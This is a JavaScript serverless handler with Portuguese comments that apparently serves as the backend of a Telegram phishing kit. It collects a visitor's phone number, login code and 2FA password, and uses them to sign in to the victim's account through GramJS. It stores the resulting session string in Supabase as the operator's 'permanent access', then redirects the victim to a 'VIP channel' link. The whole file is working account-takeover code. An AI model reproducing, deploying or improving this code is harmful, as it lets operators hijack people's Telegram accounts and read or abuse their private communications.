import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import { Api } from "telegram/tl";
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
const apiId = parseInt(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;

export default async function handler(req, res) {
  // Agora aceita 'password' também (para casos de 2FA)
  const { phoneNumber, code, password } = req.body;

  // 1. Resgata o estado intermediário do Supabase
  const { data: authData } = await supabase
    .from('auth_state')
    .select('*')
    .eq('phone_number', phoneNumber)
    .single();

  if (!authData) {
      return res.status(400).json({ error: "Sessão expirada ou não encontrada. Recomece." });
  }

  // 2. Recria o cliente com a sessão temporária
  const client = new TelegramClient(new StringSession(authData.temp_session), apiId, apiHash, {
    connectionRetries: 5,
    useWSS: false, // Importante para Vercel
  });
  
  await client.connect();

  try {
    // CENÁRIO A: Usuário enviou a Senha (Passo 3 - 2FA)
    if (password) {
        // O método .signIn() do GramJS lida automaticamente com a criptografia SRP da senha
        await client.signIn({
            password: password,
            phoneNumber: phoneNumber,
            phoneCodeHash: authData.phone_code_hash,
            phoneCode: code,
        });
    } 
    // CENÁRIO B: Usuário enviou apenas o Código (Passo 2)
    else {
        try {
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber,
                    phoneCodeHash: authData.phone_code_hash,
                    phoneCode: code,
                })
            );
        } catch (error) {
            // Se o Telegram devolver erro de senha, avisamos o frontend para pedir a senha
            if (error.message.includes("SESSION_PASSWORD_NEEDED")) {
                await client.disconnect();
                return res.status(200).json({ status: 'needs_2fa' });
            }
            throw error; // Outros erros (código errado, flood) explodem para o catch final
        }
    }

    // 3. SUCESSO! Salva a sessão definitiva (O seu acesso permanente)
    const finalSession = client.session.save();
    
    // Salva ou Atualiza a sessão no banco
    await supabase.from('telegram_sessions').upsert({
      phone_number: phoneNumber,
      session_string: finalSession,
      is_active: true
    }, { onConflict: 'phone_number' });

    // Limpa o estado temporário (segurança)
    await supabase.from('auth_state').delete().eq('phone_number', phoneNumber);
    
    await client.disconnect();
    
    // 4. Redireciona para o Link do Canal VIP
    res.status(200).json({ 
        success: true, 
        redirect: "https://t.me/+krRexYUrqMVkMmNh" 
    });

  } catch (error) {
    await client.disconnect();
    console.error("Erro no login:", error);
    res.status(400).json({ error: error.message || "Erro ao verificar código" });
  }
}
